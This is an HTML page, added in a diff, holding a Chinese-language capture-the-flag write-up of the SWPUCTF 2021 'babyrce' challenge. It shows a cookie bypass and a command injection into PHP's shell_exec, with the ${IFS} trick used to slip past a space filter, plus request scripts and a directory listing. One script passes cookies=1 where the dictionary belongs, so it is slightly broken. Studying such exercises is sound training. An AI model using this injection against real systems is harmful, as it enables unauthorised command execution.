@@ -1,0 +1,72 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce</title>
+</head>
+<body>
+<b>从0开始的web生涯 - [SWPUCTF 2021 新生赛]babyrce</b><br>
+<small>2025-04-27</small>
+<hr>
+<pre><code>&lt;?php
+error_reporting(0);
+header(&quot;Content-Type:text/html;charset=utf-8&quot;);
+highlight_file(__FILE__);
+if($_COOKIE[&#x27;admin&#x27;]==1) &#123;
+	include &quot;../next.php&quot;;
+&#125; else
+    echo &quot;小饼干最好吃啦！&quot;;
+?&gt; 小饼干最好吃啦！</code></pre>
+
+<p>直接传递cookies admin 为1 就可以</p>
+<pre><code>import requests 
+
+url = &quot;http://node5.anna.nssctf.cn:29857/&quot;
+
+cookies = &#123;
+
+  &#x27;admin&#x27;: &quot;1&quot;
+
+&#125;
+
+resp = requests.post(url=url,cookies=1)
+
+print(resp.text)
+
+</code></pre>
+
+<p>得到rasalghul.php</p>
+<pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+error_reporting(0);
+if (isset($_GET[&#x27;url&#x27;])) &#123;
+	$ip=$_GET[&#x27;url&#x27;];
+	if(preg_match(&quot;/ /&quot;, $ip)) &#123;
+		die(&#x27;nonono&#x27;);
+	&#125;
+	$a = shell_exec($ip);
+	echo $a;
+&#125;
+?&gt;</code></pre>
+
+<p>正则过滤空格 ${IFS}可绕过 ${IFS} - Linux 下的空白字符 </p>
+<pre><code>import requests 
+
+param = &quot;ls$&#123;IFS&#125;/&quot;
+
+url = f&quot;http://node5.anna.nssctf.cn:29857/rasalghul.php?url=&#123;param&#125;&quot;
+
+resp = requests.get(url=url)
+
+print(resp.text)</code></pre>
+
+<p>flag为flllllaaaaaaggggggg</p>
+<blockquote>
+<p>boot<br>dev<br>etc<br>flllllaaaaaaggggggg<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>srv<br>sys<br>tmp<br>usr<br>var</p>
+</blockquote>
+<p>结束</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
